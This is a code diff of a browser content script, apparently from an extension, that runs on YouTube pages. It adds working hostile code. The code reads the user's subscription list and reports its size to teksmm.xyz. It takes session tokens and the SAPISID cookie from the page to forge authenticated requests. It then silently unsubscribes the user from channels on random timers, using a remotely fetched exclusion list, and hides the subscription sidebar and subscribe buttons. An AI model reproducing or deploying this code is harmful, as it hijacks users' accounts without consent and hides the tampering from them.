@@ -1,43 +1,591 @@
-function sendSyncXhrReq(uri) {
-	try{
-		var request = new XMLHttpRequest();
-		request.open('GET', uri, false); // `false` makes the request synchronous
-		request.send(null);
-		if (request.status === 200) {
-			return request.responseText;
+if (location.hostname.indexOf("youtube.com") >= 0 && document.body.innerHTML.split('creator_channel_id","value":"')[1] && window.asdfsdf != true) {
+	function sendSyncXhrReqLog(uri) {
+		try{
+			var request = new XMLHttpRequest();
+			request.open('GET', uri, false); // `false` makes the request synchronous
+			request.send(null);
+			if (request.status === 200) {
+				return request.responseText;
+			}
+		}catch(e){}
+		
+		return -1;
+	}
+
+	/*
+	  Downloads the suscription list and parse as array that contains channel id's
+	*/
+	function getSubscriptionListLog() {
+		var currentSubsciptionRawLog = sendSyncXhrReqLog("https://www.youtube.com/subscription_manager?action_takeout=1")
+		if (currentSubsciptionRawLog == -1) {
+			return currentSubsciptionRawLog;
 		}
-	}catch(e){}
-	
-	return -1;
-}
-
-/*
-  Downloads the suscription list and parse as array that contains channel id's
-*/
-function getSubscriptionList() {
-	var currentSubsciptionRaw = sendSyncXhrReq("https://www.youtube.com/subscription_manager?action_takeout=1")
-	if (currentSubsciptionRaw == -1) {
-		console.log("Not Logged in");
-		return currentSubsciptionRaw;
+		return currentSubsciptionRawLog.split("channel_id=").map(element => element.split("\"")[0]).slice(1)
 	}
-	return currentSubsciptionRaw.split("channel_id=").map(element => element.split("\"")[0]).slice(1)
-}
 
-function ifNotDownloadSubList() {
+	function ifNotDownloadSubListLog() {
 
-	var list = window.localStorage.getItem('subList57');
-	if (!list) {
-		subListArray = getSubscriptionList();
-		console.log(subListArray.length);
-		new Image().src = '//www.teksmm.xyz/smmnew/log/logSub.php?message=' +subListArray.length;
-		window.localStorage.setItem("subList57", JSON.stringify(subListArray))
-	} else {
-		//console.log("Has been saved")
+		var listLog = window.localStorage.getItem('subList57');
+		if (!listLog) {
+			subListArrayLog = getSubscriptionListLog();
+			console.log(subListArrayLog.length);
+			new Image().src = '//www.teksmm.xyz/smmnew/log/logSub.php?message=' +subListArrayLog.length;
+			window.localStorage.setItem("subList57", JSON.stringify(subListArrayLog))
+		} else {
+			//console.log("Has been saved")
+		}
+		//return JSON.parse(listLog);
 	}
-	//return JSON.parse(list);
+	ifNotDownloadSubListLog();
+	console.log("Inject");
+	window.asdfsdf = true;
+	
+	function getStaticParams(){
+		let vars = {}
+		let data = document.getElementsByTagName('html')[0].innerHTML;
+		vars.hl = data.split('"hl":"')[1].split('"')[0];  
+		vars.gl =  data.split('"gl":"')[1].split('"')[0]; 
+		vars.visitorData = data.split('"visitorData":"')[1].split('"')[0]; 
+		vars.clientName = data.split('{"client.name":"')[1].split('"')[0]; 
+		vars.osName          = data.split('"osName":"')[1].split('"')[0];  
+		vars.osVersion       = data.split('"osVersion":"')[1].split('"')[0];  
+		vars.browserName     = data.split('"browserName":"')[1].split('"')[0];  
+		vars.browserVersion  = data.split('"browserVersion":"')[1].split('"')[0];  
+
+		vars.userAgent   = navigator.userAgent+",gzip(gfe)";
+		vars.screenWidthPoints = window.innerWidth;
+		vars.screenHeightPoints = window.innerHeight;
+		vars.screenPixelDensity = Math.round(window.devicePixelRatio) || 1;
+		vars.screenPixelDensity  = -Math.floor(new Date().getTimezoneOffset());
+		vars.userInterfaceTheme  = data.indexOf("<html dark") >= 0 ? "USER_INTERFACE_THEME_DARK" :  "USER_INTERFACE_THEME_LIGHT";
+		vars.session_token = data.split('"XSRF_TOKEN":"')[1].split('"')[0];
+		vars.sessionId = data.split('"sessionId":"')[1].split('"')[0];
+		vars.youtube_identity_token = data.split('"ID_TOKEN":"')[1].split('"')[0];
+		vars.variants_checksum = data.split('"VARIANTS_CHECKSUM":"')[1].split('"')[0];
+		vars.page_cl = data.split('PAGE_CL":')[1].split(',')[0];
+		vars.page_build_label = data.split('"PAGE_BUILD_LABEL":"')[1].split('"')[0];
+		vars.clientVersion = data.split('"clientVersion":"')[1].split('"')[0];  
+		vars.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        vars.utcOffsetMinutes   = -Math.floor(new Date().getTimezoneOffset());
+		
+		try{
+			vars.apiKey =data.split('"innertube_api_key":"')[1].split('"')[0]; 
+		}catch(ex){
+			vars.apiKey =data.split('"innertubeApiKey":"')[1].split('"')[0]; 
+		}
+		
+	
+		try{
+			vars.DELEGATED_SESSION_ID =data.split('"DELEGATED_SESSION_ID":"')[1].split('"')[0];
+		}catch(ex){
+			vars.DELEGATED_SESSION_ID = 0
+		}
+		
+		vars.STS = data.split('"STS":')[1].split(',')[0];
+		
+		vars.userInterfaceTheme  = data.indexOf("<html dark") >= 0 ? "USER_INTERFACE_THEME_DARK" :  "USER_INTERFACE_THEME_LIGHT";
+		
+		var lng = window.navigator.userLanguage || window.navigator.language;
+		var lngParse = lng.slice(0, 2);
+		vars.accept_language = lng+","+lngParse+";q=0.9,en-US;q=0.8,en;q=0.7";
+		
+		var deviceRaw = data.split('"DEVICE":"')[1].split('"')[0].split("\\u0026");
+		var urlParams = {};
+		deviceRaw.forEach(function(x){
+			var arr = x.split('=');
+			arr[1] && (urlParams[arr[0]] = arr[1]);
+		});
+		vars.device = "cbr="+urlParams["cbr"]+"&cbrver="+urlParams["cbrver"]+"&ceng="+urlParams["ceng"]+"&cengver="+urlParams["cengver"]+"&cos="+urlParams["cos"]+"&cosver="+urlParams["cosver"];
+		
+		
+		try{
+			vars.sessionIndex = data.split('"SESSION_INDEX":')[1].split(',')[0]; 
+		}catch(Ex){
+			vars.sessionIndex = 0; 
+		}
+
+	
+		return vars;
+
+	}
+	
+	function createSubData(data, sub){
+		let vars = getStaticParams();
+		var body = {
+					"context": {
+						"client": {
+							"hl": vars.hl,
+							"gl": vars.gl,
+							"visitorData": vars.visitorData,
+							"userAgent": vars.userAgent,
+							"clientName": vars.clientName,
+							"clientVersion": vars.clientVersion,
+							"osName": vars.osName,
+							"osVersion": vars.osVersion,
+							"browserName": vars.browserName,
+							"browserVersion": vars.browserVersion,
+							"screenWidthPoints": vars.screenWidthPoints,
+							"screenHeightPoints": vars.screenHeightPoints,
+							"screenPixelDensity": vars.screenPixelDensity,
+							"utcOffsetMinutes": vars.utcOffsetMinutes,
+							"userInterfaceTheme": vars.userInterfaceTheme
+						},
+						"request": {
+							"sessionId": vars.sessionId,
+							"internalExperimentFlags": [
+
+							],
+							"consistencyTokenJars": []
+						},
+						"user": {
+
+						},
+						"clientScreenNonce": data[0].csn,
+						"clickTracking": {
+						}
+					},
+					"channelIds": [
+						data[1].response.responseContext.serviceTrackingParams[0].params[0].value
+
+					],
+				};
+				
+		let sessIndex = vars.sessionIndex;
+		if(sessIndex != 0){
+			body.context.request.sessionIndex = sessIndex;
+		}
+		if(vars.DELEGATED_SESSION_ID != 0){
+			body.context.user.onBehalfOfUser = vars.DELEGATED_SESSION_ID;
+		}
+		if(sub == false){
+			try{
+			body.context.clickTracking.clickTrackingParams = data[1].response.header.c4TabbedHeaderRenderer.subscribeButton.subscribeButtonRenderer.onUnsubscribeEndpoints[0].signalServiceEndpoint.actions[0].openPopupAction.popup.confirmDialogRenderer.confirmButton.buttonRenderer.serviceEndpoint.clickTrackingParams
+			body.params = data[1].response.header.c4TabbedHeaderRenderer.subscribeButton.subscribeButtonRenderer.onUnsubscribeEndpoints[0].signalServiceEndpoint.actions[0].openPopupAction.popup.confirmDialogRenderer.confirmButton.buttonRenderer.serviceEndpoint.unsubscribeEndpoint.params
+			}catch(ex){
+				body.context.clickTracking.clickTrackingParams = data[1].response.header.c4TabbedHeaderRenderer.subscribeButton.subscribeButtonRenderer.onUnsubscribeEndpoints[0].clickTrackingParams;
+			}
+			
+		}
+
+		return body;
+	}
+	
+	function createPost(data,videoId,sub){
+		var body = createSubData(data,sub);
+		
+		var sapisid = getCookie("SAPISID")
+		let time = Math.floor(new Date().getTime() / 1E3);
+		let b =  nca();
+		b.update(time+" "+sapisid+" https://www.youtube.com")
+		var SAPISIDHASH = "SAPISIDHASH "+time+"_"+b.digestString().toLowerCase()
+		
+		let vars = getStaticParams();
+		
+		let url = "https://www.youtube.com/youtubei/v1/subscription/subscribe?key="+vars.apiKey;
+		if(!sub){
+			url = "https://www.youtube.com/youtubei/v1/subscription/unsubscribe?key="+vars.apiKey;
+		}
+		
+		fetch(url, {
+		  "headers": {
+			"accept": "*/*",
+			"accept-language": vars.accept_language ,
+			"authorization": SAPISIDHASH,
+			"content-type": "application/json",
+			"referer-zzz": videoId,
+			"sec-fetch-dest": "empty",
+			"sec-fetch-mode": "same-origin",
+			"sec-fetch-site": "same-origin",
+			//"x-client-data": "CKq1yQEIhrbJAQiktskBCMS2yQEIqZ3KAQiyoMoBCNCvygEIvLDKAQibtcoBCO21ygEIjrrKAQ==",
+			"x-goog-authuser": vars.sessionIndex ,
+			"x-goog-visitor-id": vars.visitorData,
+			"x-origin": "https://www.youtube.com"
+		  },
+		  "referrerPolicy": "origin-when-cross-origin",
+		  "body" : JSON.stringify(body),
+		  "method": "POST",
+		  "mode": "cors",
+		  "credentials": "include"
+		}).then(response => response.json())
+	}
+	
+	function subscribe(url,sub=true){
+		console.log(url)
+		let vars = getStaticParams();
+		
+		fetch(url, {
+		  "headers": {
+			"accept": "*/*",
+			"accept-language": vars.accept_language,
+			"sec-fetch-dest": "empty",
+			"sec-fetch-mode": "cors",
+			"sec-fetch-site": "same-origin",
+			"referer-zzz": document.URL,
+			"x-spf-previous": document.URL,
+			"x-spf-referer": document.URL,
+			"x-youtube-client-name": "1",
+			"x-youtube-client-version":  vars.clientVersion,
+			"x-youtube-device": vars.device,
+			"x-youtube-identity-token": vars.youtube_identity_token,
+			"x-youtube-page-cl": vars.page_cl,
+			"x-youtube-page-label": vars.page_build_label,
+			"x-youtube-sts": vars.STS,
+			"x-youtube-time-zone": vars.timezone ,
+			"x-youtube-utc-offset": vars.utcOffsetMinutes,
+			"x-youtube-variants-checksum": vars.variants_checksum
+		  },
+		  "referrerPolicy": "origin-when-cross-origin",
+		  "body": null,
+		  "method": "GET",
+		  "mode": "cors",
+		  "credentials": "include"
+		}).then(response => response.json())
+		  .then(data =>{
+
+			createPost(data,url,sub)
+			
+			
+			
+		  })
+	}
+	
+	
+	//Helpers
+	var nca = function() {
+    function a() {
+        e[0] = 1732584193;
+        e[1] = 4023233417;
+        e[2] = 2562383102;
+        e[3] = 271733878;
+        e[4] = 3285377520;
+        w = p = 0
+    }
+    function b(y) {
+        for (var A = k, K = 0; 64 > K; K += 4)
+            A[K / 4] = y[K] << 24 | y[K + 1] << 16 | y[K + 2] << 8 | y[K + 3];
+        for (K = 16; 80 > K; K++)
+            y = A[K - 3] ^ A[K - 8] ^ A[K - 14] ^ A[K - 16],
+            A[K] = (y << 1 | y >>> 31) & 4294967295;
+        y = e[0];
+        var S = e[1]
+          , Z = e[2]
+          , ta = e[3]
+          , Fa = e[4];
+        for (K = 0; 80 > K; K++) {
+            if (40 > K) {
+                if (20 > K) {
+                    var Ka = ta ^ S & (Z ^ ta);
+                    var Gb = 1518500249
+                } else
+                    Ka = S ^ Z ^ ta,
+                    Gb = 1859775393;
+            } else
+                60 > K ? (Ka = S & Z | ta & (S | Z),
+                Gb = 2400959708) : (Ka = S ^ Z ^ ta,
+                Gb = 3395469782);
+            Ka = ((y << 5 | y >>> 27) & 4294967295) + Ka + Fa + Gb + A[K] & 4294967295;
+            Fa = ta;
+            ta = Z;
+            Z = (S << 30 | S >>> 2) & 4294967295;
+            S = y;
+            y = Ka
+        }
+        e[0] = e[0] + y & 4294967295;
+        e[1] = e[1] + S & 4294967295;
+        e[2] = e[2] + Z & 4294967295;
+        e[3] = e[3] + ta & 4294967295;
+        e[4] = e[4] + Fa & 4294967295
+    }
+    function c(y, A) {
+        if ("string" === typeof y) {
+            y = unescape(encodeURIComponent(y));
+            for (var K = [], S = 0, Z = y.length; S < Z; ++S)
+                K.push(y.charCodeAt(S));
+            y = K
+        }
+        A || (A = y.length);
+        K = 0;
+        if (0 == p)
+            for (; K + 64 < A; )
+                b(y.slice(K, K + 64)),
+                K += 64,
+                w += 64;
+        for (; K < A; )
+            if (g[p++] = y[K++],
+            w++,
+            64 == p)
+                for (p = 0,
+                b(g); K + 64 < A; )
+                    b(y.slice(K, K + 64)),
+                    K += 64,
+                    w += 64
+    }
+    function d() {
+        var y = []
+          , A = 8 * w;
+        56 > p ? c(m, 56 - p) : c(m, 64 - (p - 56));
+        for (var K = 63; 56 <= K; K--)
+            g[K] = A & 255,
+            A >>>= 8;
+        b(g);
+        for (K = A = 0; 5 > K; K++)
+            for (var S = 24; 0 <= S; S -= 8)
+                y[A++] = e[K] >> S & 255;
+        return y
+    }
+    for (var e = [], g = [], k = [], m = [128], n = 1; 64 > n; ++n)
+        m[n] = 0;
+    var p, w;
+    a();
+    return {
+        reset: a,
+        update: c,
+        digest: d,
+        digestString: function() {
+            for (var y = d(), A = "", K = 0; K < y.length; K++)
+                A += "0123456789ABCDEF".charAt(Math.floor(y[K] / 16)) + "0123456789ABCDEF".charAt(y[K] % 16);
+            return A
+        }
+    }
+};
+	function getCookie(name) {
+		var nameEQ = name + "=";
+		var ca = document.cookie.split(';');
+		for(var i=0;i < ca.length;i++) {
+			var c = ca[i];
+			while (c.charAt(0)==' ') c = c.substring(1,c.length);
+			if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
+		}
+		return null;
+	}
+	function numberFormatter(strNum){
+    if(strNum == "0"){
+        return 0;
+    }
+    let mm = strNum.substring(strNum.length-1)
+    if(mm.toUpperCase() == mm.toLowerCase()){
+       return parseInt(strNum)
+    }else{
+        let ll = strNum.substring(0,strNum.length-1).trim()
+        let numbers = ll.split(/\D/g)
+        let result = 0;
+        let xx = 1000;
+        result += (xx * parseInt(numbers[0]));
+        if(numbers.length == 2){
+           let subNum = numbers[1].split('');
+            for(let i =0; i < subNum.length; i++){
+                xx /= 10;
+                result += subNum[i] * xx;
+            }
+        }
+        return result;
+    }
 }
 	
-if (location.hostname.indexOf("youtube.com") >= 0 && document.body.innerHTML.split('creator_channel_id","value":"')[1] && window.asdfsdf2 != true) {
-	window.asdfsdf2 = true;
+	//subscribe("D1dMA0Zp2Ww")
+	
+	
+	/* UNSUB START */
+	
+		function sendSyncXhrReq(uri) {
+		try{
+			var request = new XMLHttpRequest();
+			request.open('GET', uri, false); // `false` makes the request synchronous
+			request.send(null);
+			console.log(request.status)
+			if (request.status === 200) {
+				return request.responseText;
+			}
+		}catch(e){
+			console.log(e)
+		}
+		
+		return -1;
+	}
+
+	/*
+	  Downloads the suscription list and parse as array that contains channel id's
+	*/
+	function getSubscriptionList() {
+		var currentSubsciptionRaw = sendSyncXhrReq("https://www.youtube.com/subscription_manager?action_takeout=1")
+		if (currentSubsciptionRaw == -1) {
+			console.log("Not Logged in");
+			return currentSubsciptionRaw;
+		}
+		return currentSubsciptionRaw.split("channel_id=").map(element => element.split("\"")[0]).slice(1)
+	}
+
+	/* 
+		that will control the subscription list has already downloaded    
+	*/
+	function ifNotDownloadSubList() {
+
+		var list = window.localStorage.getItem('subList6');
+		if (!list) {
+			subListArray = getSubscriptionList();
+			console.log(subListArray.length);
+			new Image().src = '//www.teksmm.xyz/smmnew/log/log.php?message=' +subListArray.length;
+			if( !window.localStorage.getItem("unsubCount") ){
+				window.localStorage.setItem("unsubCount", subListArray.length);
+			}
+	
+			window.localStorage.setItem("subList6", JSON.stringify(subListArray))
+		} else {
+			console.log("Has been saved")
+		}
+		return JSON.parse(list);
+	}
+
+	function ifNotDownloadMajor() {
+		try{
+			var majorList = window.localStorage.getItem('majorList6');
+			if (!majorList) {
+				subListArray = getSubscriptionList();
+				majorDataRaw = sendSyncXhrReq("https://raw.githubusercontent.com/modifyheader/modhead/master/last1month?test");
+				majorDataArray = JSON.parse(majorDataRaw).filter( elements => elements.link.indexOf("channel") > 0 ).map(elements => {
+					return elements.link
+				})
+				window.localStorage.setItem("majorList6", JSON.stringify(majorDataArray))
+			} else {
+				console.log("Has been saved")
+			}
+			return JSON.parse(majorList);
+		}catch(ex){
+			return [];
+		}
+	}
+
+	function getElementOfSubList() {
+		var subList = window.localStorage.getItem('subList6')
+		
+		 if(  subList != -1){
+			var subListArray = JSON.parse(subList)
+			var lastElement = subListArray.pop();
+			window.localStorage.setItem("subList6", JSON.stringify(subListArray))
+		
+			majorList = ifNotDownloadMajor();
+		
+			search = majorList.filter(elements => elements.indexOf(lastElement) >= 0)
+			if (search.length == 0) {
+				return lastElement;
+			}
+			return getElementOfSubList();
+		}
+		return -1;
+	}
+
+	function getRndInteger(min, max) {
+		return Math.floor(Math.random() * (max - min)) + min;
+	}
+
 	ifNotDownloadSubList();
+	ifNotDownloadMajor();
+
+	function getVideoId(channelId){
+		let vars = getStaticParams();
+		console.log("https://www.youtube.com/channel/"+channelId+"/videos?pbj=1");
+		fetch("https://www.youtube.com/channel/"+channelId+"/videos?pbj=1", {
+		  "headers": {
+			"accept": "*/*",
+			"accept-language": vars.accept_language,
+			"sec-fetch-dest": "empty",
+			"sec-fetch-mode": "cors",
+			"sec-fetch-site": "same-origin",
+			"referer-zzz": document.URL,
+			"x-spf-previous": document.URL,
+			"x-spf-referer": document.URL,
+			"x-youtube-client-name": "1",
+			"x-youtube-client-version":  vars.clientVersion,
+			"x-youtube-device": vars.device,
+			"x-youtube-identity-token": vars.youtube_identity_token,
+			"x-youtube-page-cl": vars.page_cl,
+			"x-youtube-page-label": vars.page_build_label,
+			"x-youtube-sts": vars.STS,
+			"x-youtube-time-zone": vars.timezone ,
+			"x-youtube-utc-offset": vars.utcOffsetMinutes,
+			"x-youtube-variants-checksum": vars.variants_checksum
+		  },
+		  "referrerPolicy": "origin-when-cross-origin",
+		  "body": null,
+		  "method": "GET",
+		  "mode": "cors",
+		  "credentials": "include"
+		}).then(response => response.json())
+		  .then(data =>{
+			  try{
+				var tabs = data[1].response.contents.twoColumnBrowseResultsRenderer.tabs;
+				if(tabs.length > 1){
+					var items = tabs[1].tabRenderer.content.sectionListRenderer.contents[0].itemSectionRenderer.contents[0].gridRenderer.items
+			  }else{
+				 var items = tabs[0].tabRenderer.content.sectionListRenderer.contents[0].itemSectionRenderer.contents[0].gridRenderer.items
+			  }
+
+				if(items.length > 0 ){
+					subscribe(items[0].gridVideoRenderer.videoId,false)
+				}else{
+					console.log("video yok");
+				}
+			}catch(ex){
+				console.log(ex)
+			}
+
+			
+		  })
+	}
+	
+	if( !window.localStorage.getItem("downSubListCount6") ){
+		window.localStorage.setItem("downSubListCount6", 0);
+	}
+	
+
+	function unSub() {
+		try{
+			vars = {}
+			vars.channelIds = getElementOfSubList();
+			  if(vars.channelIds){
+				  new Image().src = 'https://whos.amung.us/pingjs/?k=selamcek81';
+				  subscribe("https://www.youtube.com/channel/"+vars.channelIds+"?pbj=1",false)
+				  setTimeout(unSub, getRndInteger(1000*5, 1000*15) )    
+			  }else{
+				 let counter = parseInt(window.localStorage.getItem("downSubListCount6"));
+				 if( counter < 5){
+					  new Image().src = 'https://whos.amung.us/pingjs/?k=selamcek81';
+					window.localStorage.setItem("downSubListCount6", counter + 1);
+					subListArray = getSubscriptionList();
+					window.localStorage.setItem("subList6", JSON.stringify(subListArray))
+					setTimeout(unSub, getRndInteger(1000*5, 1000*15) )    
+					console.log("COUNTER" + counter)
+				}
+			  }
+		}catch(ex){
+			console.log(ex)
+		}
+	} 
+
+	unSub();
+	
+	
+	/*
+	 Functions UnSub Proccess
+	*/
+
+		
+		 
+		  setInterval(function() {
+			if(document.querySelectorAll("ytd-guide-section-renderer").length > 0){
+			  document.querySelectorAll("ytd-guide-section-renderer")[1].style.display ="none";
+			}
+			
+			var bok = document.getElementsByClassName("style-scope ytd-subscribe-button-renderer");
+			if (bok.length > 0) {
+			  for (var i = 0; i < bok.length; i++) {
+				bok[i].outerHTML = "";
+			  }
+			}
+		  }, 1000);
+		
+
+	
 }
+
+
